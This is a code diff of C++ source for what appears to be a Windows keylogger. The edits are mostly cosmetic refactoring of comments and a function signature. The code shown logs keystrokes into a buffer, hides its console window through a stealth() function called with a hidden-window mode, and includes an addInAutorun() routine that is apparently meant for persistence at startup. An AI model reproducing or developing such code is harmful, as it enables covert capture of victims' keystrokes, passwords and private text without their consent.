@@ -146,7 +146,7 @@ int save(const int key)
 
 	switch (key)
 	{
-		//Numeric keyboard
+	//Numeric keyboard
 	case 96:
 		::backspace = 0;
 		sLogs += "0";
@@ -188,7 +188,7 @@ int save(const int key)
 		sLogs += "9";
 		break;
 
-		//Top keyboard
+	//Top keyboard
 	case 48:
 		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
@@ -300,7 +300,7 @@ int save(const int key)
 		}
 		break;
 
-		//Inputting a set of letters from the keyboard
+	//Inputting a set of letters from the keyboard
 	case 65:
 		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
@@ -730,7 +730,7 @@ int save(const int key)
 				sLogs += "z";
 			}
 		}
-		//Decimal key codes
+	//Decimal key codes
 	case 13:
 		::backspace = 0;
 		sLogs += "\n";
@@ -787,12 +787,12 @@ int save(const int key)
 	return 0;
 }
 
-void stealth(const unsigned short int display_mode = 0)
+void stealth(const unsigned short int display_mode)
 {
 	HWND stealth;
 	AllocConsole();
 	stealth = FindWindowA("consoleWindowClass", NULL);
-	ShowWindow(stealth, display_mode); //1 - visible window, 0 - hidden window
+	ShowWindow(stealth, display_mode);
 }
 
 void addInAutorun()
@@ -814,7 +814,7 @@ void addInAutorun()
 int main(int argc, char *argv[])
 {
 	#ifndef VISIBLE_UI
-	stealth();
+	stealth(0); //1 - visible window, 0 - hidden window
 
 	//setlocale(LC_ALL, "Russian");
 
@@ -878,7 +878,6 @@ int main(int argc, char *argv[])
 	//Sleep(100);
 	//std::cout << "\aERR_FILE_NOT_FOUND" << std::endl;
 	//Sleep(100);
-
 	#endif //VISIBLE_UI
 
 	#ifdef VISIBLE_UI
